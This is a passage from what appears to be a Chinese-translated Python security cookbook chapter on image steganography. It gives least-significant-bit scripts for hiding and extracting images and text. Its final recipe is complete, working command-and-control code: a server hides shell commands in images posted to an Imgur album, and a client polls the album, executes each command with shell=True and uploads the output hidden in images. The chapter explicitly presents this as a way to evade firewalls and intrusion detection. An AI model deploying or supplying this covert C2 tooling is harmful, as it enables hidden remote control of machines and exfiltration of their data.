# 第六章 图像分析和操作

在本章中，我们将涵盖以下配方：

+   使用 LSB 隐写术隐藏消息

+   提取隐藏在 LSB 中的消息

+   在图像中隐藏文本

+   从图像中提取文本

+   通过使用隐写术进行命令和控制

# 介绍

隐写术是将数据隐藏在明文中的艺术。如果您想掩盖自己的踪迹，这可能会很有用。我们可以使用隐写术来规避防火墙和 IDS 的检测。在本章中，我们将看一些 Python 如何帮助我们在图像中隐藏数据的方法。我们将通过使用**最低有效位**（**LSB**）来隐藏我们的数据，然后我们将创建一个自定义的隐写术函数。本章的最终目标将是创建一个命令和控制系统，该系统使用我们特制的图像在服务器和客户端之间传输数据。

以下图片是一个在其中隐藏了另一张图片的示例。您可以看到（或者也许看不到）人眼无法检测到任何东西：

![介绍](img/B04044_06_01.jpg)

# 使用 LSB 隐写术隐藏消息

在这个配方中，我们将使用 LSB 隐写术方法创建一个隐藏另一个图像的图像。这是隐写术的最常见形式之一。由于仅仅有一种隐藏数据的方法是不够的，我们还将编写一个脚本来提取隐藏的数据。

## 准备工作

本章中遇到的所有图像工作都将使用**Python 图像库**（**PIL**）。要在 Linux 上使用`PIP`安装 Python 图像库，请使用以下命令：

```py
$ pip install PIL

```

如果您正在 Windows 上安装它，您可能需要使用[`www.pythonware.com/products/pil/`](http://www.pythonware.com/products/pil/)上可用的安装程序。

只需确保为您的 Python 版本获取正确的安装程序。

值得注意的是，PIL 已被更新为更新版本的 PILLOW。但对于我们的需求，PIL 就足够了。

## 如何做…

图像由像素组成，每个像素由红色、绿色和蓝色（RGB）值组成（对于彩色图像）。这些值的范围是从 0 到 255，之所以如此是因为每个值都是 8 位长。纯黑色像素将由元组（R（0），G（0），B（0））表示，纯白色像素将由（R（255），G（255），B（255））表示。我们将专注于第一个配方中`R`值的二进制表示。我们将获取 8 位值并改变最右边的位。我们之所以能够这样做是因为对这一位的更改将导致像素的红色值变化少于 0.4％。这远低于人眼可以检测到的范围。

让我们现在看一下脚本，然后我们稍后将介绍它是如何工作的：

```py
  #!/usr/bin/env python

from PIL import Image

def Hide_message(carrier, message, outfile):
    c_image = Image.open(carrier)
    hide = Image.open(message)
    hide = hide.resize(c_image.size)
    hide = hide.convert('1')
    out = Image.new('RGB', c_image.size)

    width, height = c_image.size

    new_array = []

    for h in range(height):
        for w in range(width):
            ip = c_image.getpixel((w,h))
            hp = hide.getpixel((w,h))
            if hp == 0: 
                newred = ip[0] & 254
            else: 
                newred = ip[0] | 1

            new_array.append((newred, ip[1], ip[2]))

    out.putdata(new_array)
    out.save(outfile)
    print "Steg image saved to " + outfile

Hide_message('carrier.png', 'message.png', 'outfile.png')
```

## 它是如何工作的…

首先，我们从 PIL 中导入`Image`模块：

```py
from PIL import Image
```

然后，我们创建我们的`Hide_message`函数：

```py
def Hide_message(carrier, message, outfile):
```

此函数接受三个参数，如下所示：

+   `carrier`：这是我们用来隐藏另一张图片的图片的文件名

+   `message`：这是我们要隐藏的图片的文件名

+   `outfile`：这是我们的函数生成的新文件的名称

接下来，我们打开载体和消息图像：

```py
c_image = Image.open(carrier)
hide = Image.open(message)
```

然后，我们操纵要隐藏的图像，使其与我们的载体图像具有相同的大小（宽度和高度）。我们还将要隐藏的图像转换为纯黑白。这是通过将图像的模式设置为`1`来完成的：

```py
hide = hide.resize(c_image.size)
hide = hide.convert('1')
```

接下来，我们创建一个新图像，并将图像模式设置为 RGB，大小设置为载体图像的大小。我们创建两个变量来保存载体图像的宽度和高度的值，并设置一个数组；这个数组将保存我们最终保存到新图像中的新像素值，如下所示：

```py
out = Image.new('RGB', c_image.size)

width, height = c_image.size

new_array = []
```

接下来是我们函数的主要部分。我们需要获取我们想要隐藏的像素的值。如果它是黑色像素，那么我们将设置载体的红色像素的 LSB 为`0`，如果是白色，则需要设置为`1`。我们可以通过使用位操作来轻松实现这一点。如果我们想将 LSB 设置为`0`，我们可以使用`AND`值与`254`，或者如果我们想将值设置为`1`，我们可以使用`OR`值与`1`。

我们循环遍历图像中的所有像素，一旦我们有了`newred`值，我们将这些值与原始绿色和蓝色值一起附加到我们的`new_array`中：

```py
    for h in range(height):
        for w in range(width):
            ip = c_image.getpixel((w,h))
            hp = hide.getpixel((w,h))
            if hp == 0: 
                newred = ip[0] & 254
            else: 
                newred = ip[0] | 1

            new_array.append((newred, ip[1], ip[2]))

    out.putdata(new_array)
    out.save(outfile)
    print "Steg image saved to " + outfile
```

在函数的最后，我们使用`putdata`方法将新像素值数组添加到新图像中，然后使用`outfile`指定的文件名保存文件。

应该注意的是，您必须将图像保存为 PNG 文件。这是一个重要的步骤，因为 PNG 是一种无损算法。例如，如果您将图像保存为 JPEG，LSB 值将不会保持不变，因为 JPEG 使用的压缩算法会改变我们指定的值。

## 还有更多…

在这个方法中，我们使用了红色值的 LSB 来隐藏我们的图像；然而，您可以使用 RGB 值中的任何一个，甚至全部三个。一些隐写术的方法会将 8 位分割到多个像素中，以便每个位都会分割到 RGBRGBRG 等中。自然地，如果您想使用这种方法，您的载体图像将需要比您想要隐藏的消息大得多。

## 另请参阅

因此，我们现在有了一种隐藏我们的图像的方法。在下一个方法中，我们将看看如何提取该消息。

# 提取隐藏在 LSB 中的消息

这个方法将允许我们通过使用前面方法中的 LSB 技术从图像中提取隐藏的消息。

## 如何做…

如前面的方法所示，我们使用 RGB 像素的`Red`值的 LSB 来隐藏我们想要隐藏的图像中的黑色或白色像素。这个方法将颠倒这个过程，从载体图像中提取隐藏的黑白图像。让我们来看看将执行此操作的函数：

```py
#!/usr/bin/env python

from PIL import Image

def ExtractMessage(carrier, outfile):
    c_image = Image.open(carrier)
    out = Image.new('L', c_image.size)
    width, height = c_image.size
    new_array = []

    for h in range(height):
        for w in range(width):
            ip = c_image.getpixel((w,h))
            if ip[0] & 1 == 0:
                new_array.append(0)
            else:
                new_array.append(255)

    out.putdata(new_array)
    out.save(outfile)
    print "Message extracted and saved to " + outfile

ExtractMessage('StegTest.png', 'extracted.png')
```

## 工作原理…

首先，我们从 Python 图像库中导入`Image`模块：

```py
from PIL import Image
```

接下来，我们设置将用于提取消息的函数。该函数接受两个参数：`carrier`图像文件名和我们想要用提取的图像创建的文件名：

```py
def ExtractMessage(carrier, outfile):
```

接下来，我们从`carrier`图像创建一个`Image`对象。我们还为提取的数据创建一个新图像；该图像的模式设置为`L`，因为我们正在创建一个灰度图像。我们创建两个变量来保存载体图像的宽度和高度。最后，我们设置一个数组来保存我们提取的数据值：

```py
c_image = Image.open(carrier)
out = Image.new('L', c_image.size)

width, height = c_image.size

new_array = []
```

现在，进入函数的主要部分：提取。我们创建`for`循环来迭代载体的像素。我们使用`Image`对象和`getpixel`函数来返回像素的 RGB 值。为了从像素的红色值中提取 LSB，我们使用位掩码。如果我们使用一个位`AND`与红色值，使用一个掩码`1`，如果 LSB 是`0`，我们将得到一个`0`，如果是`1`，我们将得到一个`1`。因此，我们可以将其放入一个`if`语句中来创建我们新数组的值。由于我们正在创建一个灰度图像，像素值的范围是`0`到`255`，所以，如果我们知道 LSB 是`1`，我们将其转换为`255`。基本上就是这样。剩下的就是使用我们新图像的`putdata`方法来从数组创建图像，然后保存。

## 还有更多…

到目前为止，我们已经看过了在另一张图像中隐藏一张图像的方法，但还有许多其他隐藏不同数据在其他载体中的方法。有了这个提取函数和之前用于隐藏图像的方法，我们离能够通过消息发送和接收命令的东西更近了，但我们需要找到一个更好的方法来发送实际的命令。下一个方法将专注于在图像中隐藏实际文本。

# 在图像中隐藏文本

在之前的配方中，我们已经研究了如何在另一个图像中隐藏图像。这都很好，但是我们本章的主要目标是传递我们可以在命令和控制样式格式中使用的文本。这个配方的目的是在图像中隐藏一些文本。

## 如何操作...

到目前为止，我们已经专注于像素的 RGB 值。在 PNG 中，我们可以访问另一个值，即`A`值。`RGBA`的`A`值是该像素的透明度级别。在这个配方中，我们将使用这种模式，因为它将允许我们在每个值的 LSB 中存储 8 位。这意味着我们可以在两个像素中隐藏一个单个`char`值，因此我们需要一个像素计数至少是我们要隐藏的字符数量的两倍的图像。

让我们看一下脚本：

```py
from PIL import Image

def Set_LSB(value, bit):
    if bit == '0':
        value = value & 254
    else:
        value = value | 1
    return value

def Hide_message(carrier, message, outfile):
    message += chr(0)
    c_image = Image.open(carrier)
    c_image = c_image.convert('RGBA')

    out = Image.new(c_image.mode, c_image.size)
    pixel_list = list(c_image.getdata())
    new_array = []

    for i in range(len(message)):
        char_int = ord(message[i])
        cb = str(bin(char_int))[2:].zfill(8)
        pix1 = pixel_list[i*2]
        pix2 = pixel_list[(i*2)+1]
        newpix1 = []
        newpix2 = []

        for j in range(0,4):
            newpix1.append(Set_LSB(pix1[j], cb[j]))
            newpix2.append(Set_LSB(pix2[j], cb[j+4]))

        new_array.append(tuple(newpix1))
        new_array.append(tuple(newpix2))

    new_array.extend(pixel_list[len(message)*2:])

    out.putdata(new_array)
    out.save(outfile)
    print "Steg image saved to " + outfile

Hide_message('c:\\python27\\FunnyCatPewPew.png', 'The quick brown fox jumps over the lazy dogs back.', 'messagehidden.png')
```

## 它是如何工作的...

首先，我们从`PIL`中导入`Image`模块：

```py
from PIL import Image
```

接下来，我们设置一个辅助函数，它将帮助根据要隐藏的二进制设置传入值的 LSB：

```py
def Set_LSB(value, bit):
    if bit == '0':
        value = value & 254
    else:
        value = value | 1
    return value
```

我们正在使用一个位掩码来设置 LSB，根据我们传入的二进制值是`1`还是`0`。如果是`0`，我们使用掩码`254`（11111110）进行按位`AND`，如果是`1`，我们使用掩码`1`（00000001）进行按位`OR`。函数返回结果值。

接下来，我们创建我们的主要`Hide_message`方法，它接受三个参数：我们的载体图像的文件名，我们想要隐藏的消息的字符串，最后是我们将创建的输出图像的文件名：

```py
def Hide_message(carrier, message, outfile):
```

下一行代码将值`0x00`添加到字符串的末尾。这在提取函数中将很重要，因为它将告诉我们已经到达了隐藏文本的末尾。我们使用`chr()`函数将`0x00`转换为友好的字符串表示：

```py
message += chr(0)
```

代码的下一部分创建了两个图像对象：一个是我们的载体，另一个是输出图像。对于我们的载体图像，我们将模式更改为`RGBA`，以确保每个像素有四个值。然后我们创建了一些数组：`pixel_list`是来自我们载体图像的所有像素数据，`new_array`将保存我们合并的`carrier`和`message`图像的所有新像素值：

```py
c_image = Image.open(carrier) 
c_image = c_image.convert('RGBA')
out = Image.new(c_image.mode, c_image.size)

pixel_list = list(c_image.getdata())
new_array = []
```

接下来，我们在`for`循环中循环遍历消息中的每个字符：

```py
for i in range(len(message)):
```

我们首先将字符转换为`int`：

```py
char_int = ord(message[i])
```

然后我们将该`int`转换为二进制字符串，我们使用`zfill`函数确保它有 8 个字符长。这将使以后更容易。当你使用`bin()`时，它会在字符串前面加上 0 位，所以`[2:]`只是去掉了它：

```py
cb = str(bin(char_int))[2:].zfill(8)
```

接下来，我们创建两个像素变量并填充它们。我们使用当前消息字符索引的`*2`作为第一个像素，使用（当前消息字符索引的`*2`）和`1`作为第二个像素。这是因为我们每个字符使用两个像素：

```py
pix1 = pixel_list[i*2]
pix2 = pixel_list[(i*2)+1]
```

接下来，我们创建两个将保存隐藏数据值的数组：

```py
newpix1 = []
newpix2 = []
```

现在一切都设置好了，我们可以开始改变像素数据的值，我们迭代 4 次（对于 RGBA 值），并调用我们的辅助方法来设置 LSB。`newpix1`函数将包含我们 8 位字符的前 4 位；`newpix2`将包含最后 4 位：

```py
for j in range(0,4):
            newpix1.append(Set_LSB(pix1[j], cb[j]))
            newpix2.append(Set_LSB(pix2[j], cb[j+4]))
```

一旦我们有了新的值，我们将把它们转换为元组并附加到`new_array`中：

```py
new_array.append(tuple(newpix1))
new_array.append(tuple(newpix2))
```

以下是描述我们将实现的图像：

![它是如何工作的...](img/B04044_06_02.jpg)

剩下要做的就是用载体图像中剩余的像素扩展`new_array`方法，然后使用传递给我们的`Hide_message`函数的`filename`参数保存它：

```py
new_array.extend(pixel_list[len(message)*2:])

out.putdata(new_array)
out.save(outfile)
print "Steg image saved to " + outfile
```

## 还有更多...

正如在本配方开始时所述，我们需要确保载体图像的像素计数是我们要隐藏的消息的两倍大小。我们可以添加一个检查，如下所示：

```py
if len(message) * 2 < len(list(image.getdata())):
  #Throw an error and advise the user
```

对于这个配方来说，基本上就是这样；我们现在可以在图像中隐藏文本，而且还可以使用之前的配方隐藏图像。在下一个配方中，我们将提取文本数据。

# 从图像中提取文本

在上一个配方中，我们看到了如何隐藏文本在图像的`RGBA`值中。这个配方将让我们提取这些数据。

## 如何做…

我们在上一个配方中看到，我们将字符的字节分成 8 位，并将它们分布在两个像素的 LSB 上。这里是那个图表，作为提醒：

![如何做…](img/B04044_06_03.jpg)

以下是将执行提取的脚本：

```py
from PIL import Image
from itertools import izip

def get_pixel_pairs(iterable):
    a = iter(iterable)
    return izip(a, a)

def get_LSB(value):
    if value & 1 == 0:
        return '0'
    else:
        return '1'

def extract_message(carrier):
    c_image = Image.open(carrier)
    pixel_list = list(c_image.getdata())
    message = ""

    for pix1, pix2 in get_pixel_pairs(pixel_list):
        message_byte = "0b"
        for p in pix1:
            message_byte += get_LSB(p)

        for p in pix2:
            message_byte += get_LSB(p)

        if message_byte == "0b00000000":
            break

        message += chr(int(message_byte,2))
    return message

print extract_message('messagehidden.png')
```

## 它是如何工作的…

首先，我们从`PIL`导入`Image`模块；我们还从`itertools`导入`izip`模块。`izip`模块将用于返回像素对：

```py
from PIL import Image
from itertools import izip
```

接下来，我们创建两个辅助函数。`get_pixel_pairs`函数接受我们的像素列表并返回对；由于每个消息字符分布在两个像素上，这使得提取更容易。另一个辅助函数`get_LSB`将接受`R`、`G`、`B`或`A`值，并使用位掩码获取 LSB 值，并以字符串格式返回它：

```py
def get_pixel_pairs(iterable):
    a = iter(iterable)
    return izip(a, a)

def get_LSB(value):
    if value & 1 == 0:
        return '0'
    else:
        return '1'
```

接下来，我们有我们的主要`extract_message`函数。这需要我们载体图像的文件名：

```py
def extract_message(carrier):
```

然后，我们从传入的文件名创建一个图像对象，然后从图像数据创建一个像素数组。我们还创建一个名为`message`的空字符串；这将保存我们提取的文本：

```py
c_image = Image.open(carrier)
pixel_list = list(c_image.getdata())
message = ""
```

接下来，我们创建一个`for`循环，它将迭代使用我们的辅助函数“get_pixel_pairs”返回的所有像素对；我们将返回的对设置为`pix1`和“pix2”：

```py
for pix1, pix2 in get_pixel_pairs(pixel_list):
```

我们将创建的代码的下一部分是一个字符串变量，它将保存我们的二进制字符串。Python 通过`0b`前缀知道它将是字符串的二进制表示。然后，我们迭代每个像素（`pix1`和`pix2`）中的`RGBA`值，并将该值传递给我们的辅助函数`get_LSB`，返回的值将附加到我们的二进制字符串上：

```py
message_byte = "0b"
for p in pix1:
    message_byte += get_LSB(p)
for p in pix2:
    message_byte += get_LSB(p)
```

当前面的代码运行时，我们将得到一个字符的二进制表示的字符串。字符串看起来像这样`0b01100111`，我们在隐藏的消息末尾放置了一个停止字符，将是`0x00`，当提取部分输出时，我们需要跳出`for`循环，因为我们知道已经到达了隐藏文本的末尾。下一部分为我们进行了检查：

```py
if message_byte == "0b00000000":
            break
```

如果不是我们的停止字节，那么我们可以将字节转换为其原始字符，并将其附加到我们的消息字符串的末尾：

```py
message += chr(int(message_byte,2))
```

剩下的就是从函数中返回完整的消息字符串。

## 还有更多…

现在我们有了隐藏和提取函数，我们可以将它们放在一起成为一个类，我们将在下一个配方中使用。我们将添加一个检查，以测试该类是否已被其他类使用，或者是否正在独立运行。整个脚本如下。`hide`和`extract`函数已经稍作修改，以接受图像 URL；此脚本将在第八章的 C2 示例中使用，*负载和外壳*：

```py
#!/usr/bin/env python

import sys
import urllib
import cStringIO

from optparse import OptionParser
from PIL import Image
from itertools import izip

def get_pixel_pairs(iterable):
    a = iter(iterable)
    return izip(a, a)

def set_LSB(value, bit):
    if bit == '0':
        value = value & 254
    else:
        value = value | 1
    return value

def get_LSB(value):
    if value & 1 == 0:
        return '0'
    else:
        return '1'

def extract_message(carrier, from_url=False):
    if from_url:
        f = cStringIO.StringIO(urllib.urlopen(carrier).read())
        c_image = Image.open(f)
    else:
        c_image = Image.open(carrier)

    pixel_list = list(c_image.getdata())
    message = ""

    for pix1, pix2 in get_pixel_pairs(pixel_list):
        message_byte = "0b"
        for p in pix1:
            message_byte += get_LSB(p)

        for p in pix2:
            message_byte += get_LSB(p)

        if message_byte == "0b00000000":
            break

        message += chr(int(message_byte,2))
    return message

def hide_message(carrier, message, outfile, from_url=False):
    message += chr(0)
    if from_url:
        f = cStringIO.StringIO(urllib.urlopen(carrier).read())
        c_image = Image.open(f)
    else:
        c_image = Image.open(carrier)

    c_image = c_image.convert('RGBA')

    out = Image.new(c_image.mode, c_image.size)
    width, height = c_image.size
    pixList = list(c_image.getdata())
    newArray = []

    for i in range(len(message)):
        charInt = ord(message[i])
        cb = str(bin(charInt))[2:].zfill(8)
        pix1 = pixList[i*2]
        pix2 = pixList[(i*2)+1]
        newpix1 = []
        newpix2 = []

        for j in range(0,4):
            newpix1.append(set_LSB(pix1[j], cb[j]))
            newpix2.append(set_LSB(pix2[j], cb[j+4]))

        newArray.append(tuple(newpix1))
        newArray.append(tuple(newpix2))

    newArray.extend(pixList[len(message)*2:])

    out.putdata(newArray)
    out.save(outfile)
    return outfile   

if __name__ == "__main__":

    usage = "usage: %prog [options] arg1 arg2"
    parser = OptionParser(usage=usage)
    parser.add_option("-c", "--carrier", dest="carrier",
                help="The filename of the image used as the carrier.",
                metavar="FILE")
    parser.add_option("-m", "--message", dest="message",
                help="The text to be hidden.",
                metavar="FILE")
    parser.add_option("-o", "--output", dest="output",
                help="The filename the output file.",
                metavar="FILE")
    parser.add_option("-e", "--extract",
                action="store_true", dest="extract", default=False,
                help="Extract hidden message from carrier and save to output filename.")
    parser.add_option("-u", "--url",
                action="store_true", dest="from_url", default=False,
                help="Extract hidden message from carrier and save to output filename.")

    (options, args) = parser.parse_args()
    if len(sys.argv) == 1:
        print "TEST MODE\nHide Function Test Starting ..."
        print hide_message('carrier.png', 'The quick brown fox jumps over the lazy dogs back.', 'messagehidden.png')
        print "Hide test passed, testing message extraction ..."
        print extract_message('messagehidden.png')
    else:
        if options.extract == True:
            if options.carrier is None:
                parser.error("a carrier filename -c is required for extraction")
            else:
                print extract_message(options.carrier, options.from_url)
        else:
            if options.carrier is None or options.message is None or options.output is None:
                parser.error("a carrier filename -c, message filename -m and output filename -o are required for steg")
            else:
                hide_message(options.carrier, options.message, options.output, options.from_url)
```

# 使用隐写术启用命令和控制

这个配方将展示隐写术如何被用来控制另一台机器。如果您试图规避入侵检测系统（IDS）/防火墙，这可能会很方便。在这种情况下，唯一可见的流量是来自客户机的 HTTPS 流量。这个配方将展示一个基本的服务器和客户端设置。

## 准备工作

在这个配方中，我们将使用图像分享网站 Imgur 来托管我们的图像。这样做的原因很简单，即 Imgur 的 Python API 易于安装且易于使用。您也可以选择使用其他网站。但是，如果您希望使用此脚本，您需要在 Imgur 上创建一个帐户，并注册一个应用程序以获取 API 密钥和密钥。完成后，您可以使用`pip`安装`imgur` Python 库：

```py
$ pip install imgurpython

```

您可以在[`www.imgur.com`](http://www.imgur.com)注册一个帐户。

注册账户后，您可以注册一个应用程序，以从[`api.imgur.com/oauth2/addclient`](https://api.imgur.com/oauth2/addclient)获取 API 密钥和密钥。

一旦您拥有 imgur 账户，您需要创建一个相册并将图像上传到其中。

这个步骤将从上一个步骤中导入完整的隐写文本脚本。

## 操作步骤…

这个步骤的工作方式分为两部分。我们将有一个脚本作为服务器运行和操作，另一个脚本作为客户端运行和操作。我们的脚本将遵循的基本步骤如下所述：

1.  运行服务器脚本。

1.  服务器等待客户端宣布它已准备就绪。

1.  运行客户端脚本。

1.  客户端通知服务器它已准备就绪。

1.  服务器显示客户端正在等待，并提示用户发送到客户端的命令。

1.  服务器发送一个命令。

1.  服务器等待响应。

1.  客户端接收命令并运行它。

1.  客户端发送命令的输出回到服务器。

1.  服务器接收来自客户端的输出并显示给用户。

1.  步骤 5 到 10 将重复执行，直到发送`quit`命令。

考虑到这些步骤，让我们首先看一下服务器脚本：

```py
from imgurpython import ImgurClient
import StegoText, random, time, ast, base64

def get_input(string):
    ''' Get input from console regardless of python 2 or 3 '''
    try:
        return raw_input(string)
    except:
        return input(string)

def create_command_message(uid, command):
    command = str(base64.b32encode(command.replace('\n','')))
    return "{'uuid':'" + uid + "','command':'" + command + "'}"

def send_command_message(uid, client_os, image_url):
    command = get_input(client_os + "@" + uid + ">")
    steg_path = StegoText.hide_message(image_url, create_command_message(uid, command), "Imgur1.png", True)
    print "Sending command to client ..."
    uploaded = client.upload_from_path(steg_path)
    client.album_add_images(a[0].id, uploaded['id'])

    if command == "quit":
        sys.exit()

    return uploaded['datetime']

def authenticate():
    client_id = '<REPLACE WITH YOUR IMGUR CLIENT ID>'
    client_secret = '<REPLACE WITH YOUR IMGUR CLIENT SECRET>'

    client = ImgurClient(client_id, client_secret)
    authorization_url = client.get_auth_url('pin')

    print("Go to the following URL: {0}".format(authorization_url))
    pin = get_input("Enter pin code: ")

    credentials = client.authorize(pin, 'pin')
    client.set_user_auth(credentials['access_token'], credentials['refresh_token'])

    return client

client = authenticate()
a = client.get_account_albums("C2ImageServer")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

print "Awaiting client connection ..."

loop = True
while loop:
    time.sleep(5)
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['status'] == "ready":
            print "Client connected:\n"
            print "Client UUID:" + client_dict['uuid']
            print "Client OS:" + client_dict['os']
        else:
            print base64.b32decode(client_dict['response'])

        random.choice(client.default_memes()).link
        last_message_datetime = send_command_message(client_dict['uuid'],
        client_dict['os'],
        random.choice(client.default_memes()).link)
```

以下是我们的客户端脚本：

```py
from imgurpython import ImgurClient
import StegoText
import ast, os, time, shlex, subprocess, base64, random, sys

def get_input(string):
    try:
        return raw_input(string)
    except:
        return input(string)

def authenticate():
    client_id = '<REPLACE WITH YOUR IMGUR CLIENT ID>'
    client_secret = '<REPLACE WITH YOUR IMGUR CLIENT SECRET>'

    client = ImgurClient(client_id, client_secret)
    authorization_url = client.get_auth_url('pin')

    print("Go to the following URL: {0}".format(authorization_url))
    pin = get_input("Enter pin code: ")

    credentials = client.authorize(pin, 'pin')
    client.set_user_auth(credentials['access_token'], credentials['refresh_token'])

    return client

client_uuid = "test_client_1"

client = authenticate()
a = client.get_account_albums("<YOUR IMGUR USERNAME>")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

steg_path = StegoText.hide_message(random.choice(client.default_memes()). link,  "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'ready'}",  "Imgur1.png",True)
uploaded = client.upload_from_path(steg_path)
client.album_add_images(a[0].id, uploaded['id'])
last_message_datetime = uploaded['datetime']

while True:

    time.sleep(5) 
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['uuid'] == client_uuid:
            command = base64.b32decode(client_dict['command'])

            if command == "quit":
                sys.exit(0)

            args = shlex.split(command)
            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            p_status = p.wait()

            steg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'response', 'response':'" + str(base64.b32encode(output)) + "'}", "Imgur1.png", True)
            uploaded = client.upload_from_path(steg_path)
            client.album_add_images(a[0].id, uploaded['id'])
            last_message_datetime = uploaded['datetime']
```

## 工作原理…

首先，我们创建一个`imgur`客户端对象；authenticate 函数处理将`imgur`客户端与我们的账户和应用程序进行身份验证。当您运行脚本时，它将输出一个 URL，让您访问以获取 PIN 码输入。然后，它会获取我们的 imgur 用户名的相册列表。如果您还没有创建相册，脚本将失败，所以请确保您已经准备好相册。我们将获取列表中的第一个相册，并获取该相册中包含的所有图像的进一步列表。

图像列表按照最早上传的图像排列；为了使我们的脚本工作，我们需要知道最新上传图像的时间戳，所以我们使用`[-1]`索引来获取它并将其存储在一个变量中。完成这些步骤后，服务器将等待客户端连接：

```py
client = authenticate()
a = client.get_account_albums("<YOUR IMGUR ACCOUNT NAME>")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

print "Awaiting client connection ..."
```

一旦服务器等待客户端连接，我们就可以运行客户端脚本。客户端脚本的初始启动创建了一个`imgur`客户端对象，就像服务器一样，但不是等待；相反，它生成一条消息并将其隐藏在一个随机图像中。这条消息包含客户端正在运行的`os`类型（这将使服务器用户更容易知道要运行什么命令），一个`ready`状态，以及客户端的标识符（如果您想扩展脚本以允许多个客户端连接到服务器）。

一旦图像上传完成，`last_message_datetime`函数就会设置为新的时间戳：

```py
client_uuid = "test_client_1"

client = authenticate()
a = client.get_account_albums("C2ImageServer")

imgs = client.get_album_images(a[0].id)
last_message_datetime = imgs[-1].datetime

steg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'ready'}",  "Imgur1.png",True)
uploaded = client.upload_from_path(steg_path)
client.album_add_images(a[0].id, uploaded['id'])
last_message_datetime = uploaded['datetime']
```

服务器将等待直到看到消息；它通过使用`while`循环来做到这一点，并检查比启动时保存的图像日期时间晚的图像。一旦看到有新的图像，它将下载并提取消息。然后检查消息是否是客户端准备好的消息；如果是，它会显示`uuid`客户端和`os`类型，然后提示用户输入：

```py
loop = True
while loop:
    time.sleep(5)
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict = ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['status'] == "ready":
            print "Client connected:\n"
            print "Client UUID:" + client_dict['uuid']
            print "Client OS:" + client_dict['os']
```

用户输入命令后，它会使用 base32 对其进行编码，以避免破坏我们的消息字符串。然后将其隐藏在一个随机图像中，并上传到 imgur。客户端坐在一个循环中等待这条消息。这个循环的开始方式与我们的服务器相同；如果它看到一个新的图像，它会检查是否使用`uuid`寻址到这台机器，如果是，它将提取消息，将其转换为`Popen`将接受的友好格式，然后使用`Popen`运行命令。然后等待命令的输出，然后将其隐藏在一个随机图像中并上传到 imgur：

```py
loop = True
while loop:

    time.sleep(5) 
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))
        if client_dict['uuid'] == client_uuid:
            command = base64.b32decode(client_dict['command'])

            if command == "quit":
                sys.exit(0)

            args = shlex.split(command)
            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            p_status = p.wait()

            steg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'response', 'response':'" + str(base64.b32encode(output)) + "'}",  "Imgur1.png", True)
            uploaded = client.upload_from_path(steg_path)
            client.album_add_images(a[0].id, uploaded['id'])
            last_message_datetime = uploaded['datetime']
```

服务器所需做的就是获取新图像，提取隐藏的输出，并将其显示给用户。然后它会给出一个新的提示，等待下一个命令。就是这样；这是一种非常简单的通过隐写术传递命令和控制数据的方法。
